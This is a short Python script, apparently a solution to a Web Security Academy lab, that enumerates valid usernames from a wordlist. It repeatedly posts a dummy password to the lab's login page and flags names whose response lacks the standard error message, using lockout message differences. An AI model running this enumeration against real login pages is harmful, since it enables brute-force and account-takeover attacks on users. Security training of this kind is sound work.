from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parent.parent
USERNAMES_FILE = ROOT / "wordlists" / "usernames.txt"

URL = 'https://0a74005e04dd7a98832e5c1c004f00da.web-security-academy.net/login'
# 失敗時に返される標準的なエラーメッセージ
normal_error = 'Invalid username or password.'

with open(USERNAMES_FILE, 'r') as f:
    usernames = f.read().splitlines()

print('[*] エラーメッセージの差分によるユーザー名列挙を開始します')

session = requests.Session()

for username in usernames:
    is_valid_user = False

    # 同一ユーザー名で複数回試行し、レート制限に伴うメッセージ差分を観測する
    for i in range(5):
        data = {
            'username': username,
            'password': 'a'
        }

        try:
            response = session.post(URL, data=data, timeout=5)

            # 標準のエラーメッセージが返らなければ有効ユーザーの可能性が高い
            if normal_error not in response.text:
                is_valid_user = True
                break

        except Exception:
            break

    status_icon = '○' if is_valid_user else '×'
    print(f'{username:20} → {status_icon}')
